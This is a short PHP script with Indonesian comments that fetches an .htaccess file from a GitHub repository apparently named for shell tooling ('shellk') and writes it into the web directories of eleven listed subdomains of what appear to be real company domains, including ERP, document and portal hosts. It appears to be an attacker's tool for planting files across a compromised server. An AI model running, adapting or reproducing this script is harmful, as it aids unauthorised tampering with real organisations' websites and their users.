<?php
// Fungsi untuk mengunduh file
function downloadFile($url, $path) {
    $ch = curl_init($url);
    $fp = fopen($path, 'wb');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
    fclose($fp);
}

// Daftar subdomain dan URL .htaccess yang akan diunduh
$subdomains = array(
    'blognews.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'dev.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'dms.mitrabakti.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'dms.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'document.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'erp.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'itsm.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'portal.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'sla.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'test.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess',
    'undianhut.mitrabaktiut.co.id' => 'https://raw.githubusercontent.com/NowMeee/shellk/master/.htaccess'
);

// Direktori tempat Anda ingin menyimpan .htaccess
$directory = '/path/to/your/directory/';

// Unduh .htaccess untuk setiap subdomain
foreach ($subdomains as $subdomain => $url) {
    $fileName = $directory . $subdomain . '/.htaccess';
    downloadFile($url, $fileName);
    echo "File .htaccess untuk $subdomain berhasil diunduh.\n";
}
?>
